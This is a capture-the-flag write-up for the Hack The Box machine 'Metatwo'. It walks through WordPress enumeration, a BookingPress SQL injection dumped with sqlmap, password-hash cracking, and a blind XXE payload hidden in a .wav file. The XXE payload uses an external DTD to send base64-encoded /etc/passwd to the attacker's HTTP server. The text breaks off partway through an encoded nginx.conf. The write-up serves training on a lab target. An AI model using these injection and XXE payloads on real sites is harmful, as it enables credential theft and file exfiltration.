# Metatwo
<div align="center">
  <img src="https://github.com/Wanasgheo/Writeups/assets/111740362/eb3c48dd-3bf8-4fb6-a408-0a82ec654b44"></img> 
</div>

Welcome back into another easy machine, where we will face a website built in wordpress and an interesting way of getting foothold, so let's dive in with the nmap scan!

```
┌──(kali㉿kali)-[~/diego/Hack_the_box/Machines/Metatwo]
└─$ cat meta.txt 
# Nmap 7.92 scan initiated Mon Nov 28 13:26:42 2022 as: nmap -sC -sV -oN meta.txt 10.10.11.186
Nmap scan report for 10.10.11.186
Host is up (0.058s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp?
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c4:b4:46:17:d2:10:2d:8f:ec:1d:c9:27:fe:cd:79:ee (RSA)
|   256 2a:ea:2f:cb:23:e8:c5:29:40:9c:ab:86:6d:cd:44:11 (ECDSA)
|_  256 fd:78:c0:b0:e2:20:16:fa:05:0d:eb:d8:3f:12:a4:ab (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://metapress.htb/
|_http-server-header: nginx/1.18.0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.92%I=7%D=11/28%Time=6384FD70%P=x86_64-pc-linux-gnu%r(Gen
SF:ericLines,8F,"220\x20ProFTPD\x20Server\x20\(Debian\)\x20\[::ffff:10\.10
SF:\.11\.186\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20cr
SF:eative\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creativ
SF:e\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Nov 28 13:28:44 2022 -- 1 IP address (1 host up) scanned in 121.73 seconds
```

We got the usual ports and even the ftp one, where the login as anonymous is not allowed so we can move to the site

<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/4668a2e3-8e8c-4720-ad1a-87be4b391a7b"></img>

There are a lot of endpoints, but we can easiliy grep them with gobuster

```diff
┌──(kali㉿kali)-[~/diego/Hack_the_box/Machines/Metatwo]
└─$ gobuster dir --wordlist=/usr/share/wordlists/dirb/big.txt -u "http://metapress.htb"                                                                                                                                                1 ⨯
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://metapress.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/11/28 14:32:18 Starting gobuster in directory enumeration mode
===============================================================
/!                    (Status: 301) [Size: 0] [--> http://metapress.htb/]
/.htaccess            (Status: 200) [Size: 633]                          
/0                    (Status: 301) [Size: 0] [--> http://metapress.htb/0/]
/0000                 (Status: 301) [Size: 0] [--> http://metapress.htb/0000/]
/A                    (Status: 301) [Size: 0] [--> http://metapress.htb/about-us/]
/About                (Status: 301) [Size: 0] [--> http://metapress.htb/about-us/]
/C                    (Status: 301) [Size: 0] [--> http://metapress.htb/cancel-appointment/]
/E                    (Status: 301) [Size: 0] [--> http://metapress.htb/events/]            
/Events               (Status: 301) [Size: 0] [--> http://metapress.htb/Events/]            
/H                    (Status: 301) [Size: 0] [--> http://metapress.htb/hello-world/]       
/S                    (Status: 301) [Size: 0] [--> http://metapress.htb/sample-page/]       
/T                    (Status: 301) [Size: 0] [--> http://metapress.htb/thank-you/]         
/a                    (Status: 301) [Size: 0] [--> http://metapress.htb/about-us/]          
/ab                   (Status: 301) [Size: 0] [--> http://metapress.htb/about-us/]          
/abo                  (Status: 301) [Size: 0] [--> http://metapress.htb/about-us/]          
/about                (Status: 301) [Size: 0] [--> http://metapress.htb/about-us/]          
/about-us             (Status: 301) [Size: 0] [--> http://metapress.htb/about-us/]          
/admin                (Status: 302) [Size: 0] [--> http://metapress.htb/wp-admin/]          
/asdfjkl;             (Status: 301) [Size: 0] [--> http://metapress.htb/asdfjkl]            
/atom                 (Status: 301) [Size: 0] [--> http://metapress.htb/feed/atom/]
/c                    (Status: 301) [Size: 0] [--> http://metapress.htb/cancel-appointment/]
/ca                   (Status: 301) [Size: 0] [--> http://metapress.htb/cancel-appointment/]
/can                  (Status: 301) [Size: 0] [--> http://metapress.htb/cancel-appointment/]
/cancel               (Status: 301) [Size: 0] [--> http://metapress.htb/cancel-appointment/]
/dashboard            (Status: 302) [Size: 0] [--> http://metapress.htb/wp-admin/]          
/e                    (Status: 301) [Size: 0] [--> http://metapress.htb/events/]            
/embed                (Status: 301) [Size: 0] [--> http://metapress.htb/embed/]             
/ev                   (Status: 301) [Size: 0] [--> http://metapress.htb/events/]            
/eve                  (Status: 301) [Size: 0] [--> http://metapress.htb/events/]            
/event                (Status: 301) [Size: 0] [--> http://metapress.htb/events/]            
/events               (Status: 301) [Size: 0] [--> http://metapress.htb/events/]            
+ /feed                 (Status: 301) [Size: 0] [--> http://metapress.htb/feed/]              
/fixed!               (Status: 301) [Size: 0] [--> http://metapress.htb/fixed]              
/h                    (Status: 301) [Size: 0] [--> http://metapress.htb/hello-world/]       
/he                   (Status: 301) [Size: 0] [--> http://metapress.htb/hello-world/]       
/hell                 (Status: 301) [Size: 0] [--> http://metapress.htb/hello-world/]       
/hello                (Status: 301) [Size: 0] [--> http://metapress.htb/hello-world/]       
/hello-world          (Status: 301) [Size: 0] [--> http://metapress.htb/hello-world/]       
/login                (Status: 302) [Size: 0] [--> http://metapress.htb/wp-login.php]       
/page1                (Status: 301) [Size: 0] [--> http://metapress.htb/]                   
/rdf                  (Status: 301) [Size: 0] [--> http://metapress.htb/feed/rdf/]          
+ /robots.txt           (Status: 200) [Size: 113]                                             
/rss                  (Status: 301) [Size: 0] [--> http://metapress.htb/feed/]              
/rss2                 (Status: 301) [Size: 0] [--> http://metapress.htb/feed/]              
/s                    (Status: 301) [Size: 0] [--> http://metapress.htb/sample-page/]       
/sa                   (Status: 301) [Size: 0] [--> http://metapress.htb/sample-page/]       
/sam                  (Status: 301) [Size: 0] [--> http://metapress.htb/sample-page/]       
/sample               (Status: 301) [Size: 0] [--> http://metapress.htb/sample-page/]       
/sample-page          (Status: 301) [Size: 0] [--> http://metapress.htb/sample-page/]
```

We have to important endpoints or the `feed` one which redirect us to a juicy xml code

```xml
<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
        xmlns:content="http://purl.org/rss/1.0/modules/content/"
        xmlns:wfw="http://wellformedweb.org/CommentAPI/"
        xmlns:dc="http://purl.org/dc/elements/1.1/"
        xmlns:atom="http://www.w3.org/2005/Atom"
        xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
        xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
        >

<channel>
        <title>MetaPress</title>
        <atom:link href="http://metapress.htb/feed/" rel="self" type="application/rss+xml" />
        <link>http://metapress.htb</link>
        <description>Official company site</description>
        <lastBuildDate>Thu, 23 Jun 2022 18:05:43 +0000</lastBuildDate>
        <language>en-US</language>
        <sy:updatePeriod>
        hourly  </sy:updatePeriod>
        <sy:updateFrequency>
        1       </sy:updateFrequency>
        <generator>https://wordpress.org/?v=5.6.2</generator>
        <item>
                <title>Welcome on board!</title>
                <link>http://metapress.htb/hello-world/</link>

                <dc:creator><![CDATA[admin]]></dc:creator>
                <pubDate>Thu, 23 Jun 2022 17:58:30 +0000</pubDate>
                                <category><![CDATA[News]]></category>
                <guid isPermaLink="false">http://metapress.htb/?p=1</guid>

                                        <description><![CDATA[<!-- wp:paragraph -->
<p>This site will be launched soon.<br>In the meanwhile you can signup to our launch event.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Be sure to do it from here:<br><a href="http://metapress.htb/events/">http://metapress.htb/events/</a></p>
<!-- /wp:paragraph -->]]></description>
                                                                                <content:encoded><![CDATA[
<p>This site will be launched soon.<br>In the meanwhile you can signup to our launch event.</p>

<p>Be sure to do it from here:<br><a href="http://metapress.htb/events/">http://metapress.htb/events/</a></p>
]]></content:encoded>

                        </item>
        </channel>
</rss>
```

There is a specifi line that tells us the wordpres version 

```xml
...
<generator>https://wordpress.org/?v=5.6.2</generator>
...
```
That's useful but, by now, we can’t see any cool stuffs while from the `robots.txt` page we can find what we were looking for

<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/3684e1d4-f095-47d9-9bb8-4df2207e19b7"></img>

By disallowing the first we get to a login page

<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/43d8399c-c665-491b-8e21-4a949715408b"></img>

Then there is even the sitemap of the xml pages

<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/8b1c3255-42fc-4515-beff-22a0e9e1a21c"></img>

While by disallowing the second we get to a page which prints 0

<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/be6bb970-85fb-449d-9a52-870057f3a61e"></img>

So before trying any sort of attack against the login form, knowing that's built in wordpress, we can try to run `wpscan`

```bash
wpscan --url http://metapress.htb --enumerate p
```

And here is what we’ve found 

<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/60a71780-3395-4227-bdb9-1ab8baf48c06"></img>

There is a theme here which is deprecated, but doesn't point us to a real foothold, so tried different type of scans like the one for the users 

```bash
wpscan --url http://metapress.htb --enumerate u
...
[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://metapress.htb/wp-json/wp/v2/users/?per_page=100&page=1
 |  Rss Generator (Aggressive Detection)
 |  Author Sitemap (Aggressive Detection)
 |   - http://metapress.htb/wp-sitemap-users-1.xml
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] manager
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
...
```

Seems that we are not able to find any vulnerable plugins but we haven’t tried yet to use the command tag  `--pluings-detection` which does a more `aggressive` scan for listing the plugins

```c
┌──(kali㉿kali)-[~/diego/Hack_the_box/Machines/Metatwo]
└─$ wpscan --url "http://metapress.htb/" --wp-content-dir /wp-content/ --enumerate vp --plugins-detection aggressive --api-token LAFXixaTv5UrElsy5lGYDaiIc6Yxuacmz9QTAPaswaY
```

Here are the used tags :

- `--wp-content-dir` = to specify the wp-content folder
- `--enumerate vp` = to enumerate for vulnerable plugins
- `--plugins-detections aggressive` = a more aggressive plugins detection
- `--api-token <token>` = a token provided from wpscan that constantly updates and upgrades itself and look for vulnerabilities.

 And after that here is the result.

```bash
...
[+] Enumerating Vulnerable Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:02:13 <==========================================================================================================================================================> (4989 / 4989) 100.00% Time: 00:02:13
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] bookingpress-appointment-booking
 | Location: http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/
 | Last Updated: 2022-11-21T13:57:00.000Z
 | Readme: http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/readme.txt
 | [!] The version is out of date, the latest version is 1.0.48
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/, status: 200
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: BookingPress < 1.0.11 - Unauthenticated SQL Injection
 |     Fixed in: 1.0.11
 |     References:
 |      - https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0739
 |      - https://plugins.trac.wordpress.org/changeset/2684789
 |
 | Version: 1.0.10 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/readme.txt
 | Confirmed By: Translation File (Aggressive Detection)
 |  - http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/languages/bookingpress-appointment-booking-en_US.po, Match: 'sion: BookingPress Appointment Booking v1.0.10'

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 3
 | Requests Remaining: 66
...
```

As you can see we have found a vulnerable plugin `bookingpress-appointment-booking`!

Knowing this by looking trough internet can we find a vuln from [wpscan](https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357) server, which needs to use the `nonce` or the special code that let the machine think to talking with the real server.

To find it we just need to look at the source code leaked and at the `http://metapress.htb/events/`` page 

<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/188be92c-0769-4760-8603-1f4e5e065a1f"></img>

Above we have the nonce while below you can see the POC of the vuln found, which is a simple SQLinjection

<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/eeefb9f8-d47d-4f0e-80c6-bfb26fd859e5"></img>

Now that we have all we need, we can try to follow it

<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/c09610df-eaf9-426b-ac63-6644a089c5df"></img>

Then we can simply clear the field, catch the request and pass it to sqlmap

```sql
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: metapress.htb
User-Agent: curl/7.85.0
Accept: */*
Content-Length: 185
Content-Type: application/x-www-form-urlencoded
Connection: close

action=bookingpress_front_get_category_services&_wpnonce=73608887bb&category_id=1&total_service=1
```

That's the request and now let's run sqlmap

```diff
┌──(kali㉿kali)-[~/diego/Hack_the_box/Machines/Metatwo]
└─$ sqlmap -r request.txt -p total_service --dbs                     
        ___
       __H__                                                                                                        
 ___ ___[']_____ ___ ___  {1.6.8#stable}                                                                            
|_ -| . [,]     | .'| . |                                                                                           
|___|_  [(]_|_|_|__,|  _|                                                                                           
      |_|V...       |_|   https://sqlmap.org                                                                        

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:32:55 /2022-12-03/

[11:32:55] [INFO] parsing HTTP request from 'request.txt'
[11:32:55] [INFO] resuming back-end DBMS 'mysql' 
[11:32:55] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: total_service (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: action=bookingpress_front_get_category_services&_wpnonce=73608887bb&category_id=1&total_service=1) AND 9115=9115 AND (5833=5833

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: action=bookingpress_front_get_category_services&_wpnonce=73608887bb&category_id=1&total_service=1) AND (SELECT 6997 FROM (SELECT(SLEEP(5)))hLNe) AND (1282=1282

    Type: UNION query
    Title: Generic UNION query (NULL) - 9 columns
    Payload: action=bookingpress_front_get_category_services&_wpnonce=73608887bb&category_id=1&total_service=1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71716b7a71,0x6f5865714344634942567757665178664d6b706873574569497977714c55714743554c5a64767363,0x716b707671),NULL-- -
---
[11:32:55] [INFO] the back-end DBMS is MySQL
web application technology: PHP 8.0.24, Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[11:32:55] [INFO] fetching database names
available databases [2]:
+ [*] blog
+ [*] information_schema

[11:32:55] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/metapress.htb'

[*] ending @ 11:32:55 /2022-12-03/
```

 We have found two tables that we can inspect by specifing them

```diff
...
| wp_bookingpress_servicesmeta         |
| wp_bookingpress_settings             |
| wp_commentmeta                       |
| wp_comments                          |
| wp_links                             |
| wp_options                           |
| wp_postmeta                          |
| wp_posts                             |
| wp_term_relationships                |
| wp_term_taxonomy                     |
| wp_termmeta                          |
| wp_terms                             |
| wp_usermeta                          |
+ | wp_users                             |
+--------------------------------------+
...
```
Those are the found tables, that we can read again with sqlmap like this 
```bash
  sqlmap -r request.txt -p total_service -D blog -T wp_users --dump
```
Let's run it

```diff
...
Database: blog
Table: wp_users
[2 entries]
+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
| ID | user_url             | user_pass                          | user_email            | user_login | user_status | display_name | user_nicename | user_registered     | user_activation_key |
+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
| 1  | http://metapress.htb | $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV. | admin@metapress.htb   | admin      | 0           | admin        | admin         | 2022-06-23 17:58:28 | <blank>             |
| 2  | <blank>              | $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70 | manager@metapress.htb | manager    | 0           | manager      | manager       | 2022-06-23 18:07:55 | <blank>             |
+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
...
```

Here are hashes that we can decrypt with johnipper

```
┌──(kali㉿kali)-[~/diego/Hack_the_box/Machines/Metatwo]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt                                                  1 ⨯
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 SSE2 4x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
partylikearockstar (?)     
1g 0:00:00:11 DONE (2022-12-03 12:54) 0.08354g/s 9223p/s 9223c/s 9223C/s penny101..onelove3
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session completed.
```
Only the `manager` one, as expected, was crackable so now we can login as `manager` trough the login page previously passed

<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/53c62498-e673-4606-a567-751d20f05cc9"></img>

We can see that we are able to load a file. The first thing that i did was to upload a php file but that extension was not reliable so i tried to bruteforce it with all the php exentions

<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/53e03b34-85c4-4d94-a242-070e05e95089"></img>


As you can see it didn’t work neither with different extensions, so we can try to see if there are other vulnerabilities by checking the version online.

We've found one  which is the [CVE-2021-29447](https://www.notion.so/Metatwo-7df69a11fb7c41b59a3e915afdf4cbfb?pvs=21), that exploit an XXE vulnerability

The idea is to use it in order to send a file .wav, which will then print back a file for us, below there is the payload

```xml
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]>
<foo><bar>&ext;</bar><foo>
```

Because the output would be printed into the terminal we need a blind XXE payload. This is doable by including an external Document Type Definition controlled by the attacker. A DTD defines the valid building blocks of an XML document. It defines the document structure with a list of validated elements and attributes. A DTD can be declared inline inside an XML document, or as an external reference.

```xml
<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM 'http://example.com/evil.dtd'>%remote;%init;%trick;]>
```

This will be our final setup for the .dtd file

```xml
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.191:8000/?p=%file;'>" >
```

And the this is the .wav one 

```xml
RIFF�WAVEiXML{<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM 'http://10.10.14.191:8000/evil.dtd'>%remote;%init;%trick;]>
```

Now we just have to create a server with python or php

```xml
python3 -m http.server | php -S 0.0.0.0:8000
```

While listening run the exploit

<img src="https://github.com/Wanasgheo/Writeups/assets/111740362/647e6cea-f533-41e6-80ee-db23e5050329"></img>

Here is the base64 decoded output

```bash
┌──(kali㉿kali)-[~/diego/Hack_the_box/Machines/Metatwo]
└─$ echo -e "cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMToxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMjoxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDk6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzc2hkOng6MTA0OjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kam5lbHNvbjp4OjEwMDA6MTAwMDpqbmVsc29uLCwsOi9ob21lL2puZWxzb246L2Jpbi9iYXNoCnN5c3RlbWQtdGltZXN5bmM6eDo5OTk6OTk5OnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb246LzovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLWNvcmVkdW1wOng6OTk4Ojk5ODpzeXN0ZW1kIENvcmUgRHVtcGVyOi86L3Vzci9zYmluL25vbG9naW4KbXlzcWw6eDoxMDU6MTExOk15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQpwcm9mdHBkOng6MTA2OjY1NTM0OjovcnVuL3Byb2Z0cGQ6L3Vzci9zYmluL25vbG9naW4KZnRwOng6MTA3OjY1NTM0Ojovc3J2L2Z0cDovdXNyL3NiaW4vbm9sb2dpbgo=" | base64 -d
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
jnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash
systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:105:111:MySQL Server,,,:/nonexistent:/bin/false
proftpd:x:106:65534::/run/proftpd:/usr/sbin/nologin
ftp:x:107:65534::/srv/ftp:/usr/sbin/nologin
```
That's the proof that the vuln properly works, now we need to find a file to read, that can lead us to a footohld like some juicy files that are always present on a worpress [site](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress). (from this site you will see some of them)

The most important is the `wp-config.php` which has the credentials for all the users to the Sql server, probably even the admin one.

The only problem, is that we don’t know the path of it, so we have to find some `nginx` basic files, and again we will use [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/nginx)


We can chec the  `/etc/nginx/nginx.conf` which is pretty imorportant

```diff
┌──(kali㉿kali)-[~/…/Hack_the_box/Machines/Metatwo/CVE-2021-29447]
└─$ echo "dXNlciB3d3ctZGF0YTsKd29ya2VyX3Byb2Nlc3NlcyBhdXRvOwpwaWQgL3J1bi9uZ2lueC5waWQ7CmluY2x1ZGUgL2V0Yy9uZ2lueC9tb2R1bGVzLWVuYWJsZWQvKi5jb25mOwoKZXZlbnRzIHsKCXdvcmtlcl9jb25uZWN0aW9ucyA3Njg7CgkjIG11bHRpX2FjY2VwdCBvbjsKfQoKaHR0cCB7CgoJIyMKCSMgQmFzaWMgU2V0dGluZ3MKCSMjCgoJc2VuZGZpbGUgb247Cgl0Y3Bfbm9wdXNoIG9uOwoJdHlwZXNfaGFzaF9tYXhfc2l6ZSAyMDQ4OwoJIyBzZXJ2ZXJfdG9rZW5zIG9mZjsKCgkjIHNlcnZlcl9uYW1lc19oYXNoX2J1Y2tldF9zaXplIDY0OwoJIyBzZXJ2ZXJfbmFtZV9pbl9yZWRpcmVjdCBvZmY7CgoJaW5jbHVkZSAvZXRjL25naW54L21pbWUudHlwZXM7CglkZWZhdWx0X3R5cGUgYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtOwoKCSMjCgkjIFNTTCBTZXR0aW5ncwoJIyMKCglzc2xfcHJvdG9jb2xzIFRMU3YxIFRMU3YxLjEgVExTdjEuMiBUTFN2MS4zOyAjIERyb3BwaW5nIFNTTHYzLCByZWY6IFBPT0RMRQoJc3NsX3ByZWZlcl9zZXJ2ZXJfY2lwaGVycyBvbjsKCgkjIwoJIyBMb2dnaW5nIFNldHRpbmdzCgkjIwoKCWFjY2Vzc19sb2cgL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZzsKCWVycm9yX2xvZyAvdmFyL2xvZy9uZ2lueC9lcnJvci5sb2c7CgoJIyMKCSMgR3ppcCBTZXR0aW5ncwoJIyMKCglnemlwIG9uOwoKCSMgZ3ppcF92YXJ5IG9uOwoJIyBnemlwX3Byb3hpZWQgYW55OwoJIyBnemlwX2NvbXBfbGV2ZWwgNjsKCSMgZ3ppcF9idWZmZXJzIDE2IDhrOwoJIyBnemlwX2h0dHBfdmVyc2lvbiAxLjE7CgkjIGd6aXBfdHlwZXMgdGV4dC9wbGFpbiB0ZXh0L2NzcyBhcHBsaWNhdGlvbi9qc29uIGFwcGxpY2F0aW9uL2phdmFzY3JpcHQgdGV4dC94bWwgYXBwbGljYXRpb24veG1sIGFwcGxpY2F0aW9uL3htbCtyc3MgdGV4dC9qYXZhc2NyaXB0OwoKCSMjCgkjIFZpcnR1YWwgSG9zdCBDb25maWdzCgkjIwoKCWluY2x1ZGUgL2V0Yy9uZ2lueC9jb25mLmQvKi5jb25mOwoJaW5jbHVkZSAvZXRjL25naW54L3NpdGVzLWVuYWJsZWQvKjsKfQoKCiNtYWlsIHsKIwkjIFNlZSBzYW1wbGUgYXV0aGVudGljYXRpb24gc2NyaXB0IGF0OgojCSMgaHR0cDovL3dpa2kubmdpbngub3JnL0ltYXBBdXRoZW50aWNhdGVXaXRoQXBhY2hlUGhwU2NyaXB0CiMKIwkjIGF1dGhfaHR0cCBsb2NhbGhvc3QvYXV0aC5waHA7CiMJIyBwb3AzX2NhcGFiaWxpdGllcyAiVE9QIiAiVVNFUiI7CiMJIyBpbWFwX2NhcGFiaWxpdGllcyAiSU1BUDRyZXYxIiAiVUlEUExVUyI7CiMKIwlzZXJ2ZXIgewojCQlsaXN0ZW4gICAgIGxvY2FsaG9zdDoxMTA7CiMJCXByb3RvY29sICAgcG9wMzsKIwkJcHJveHkgICAgICBvbjsKIwl9CiMKIwlzZXJ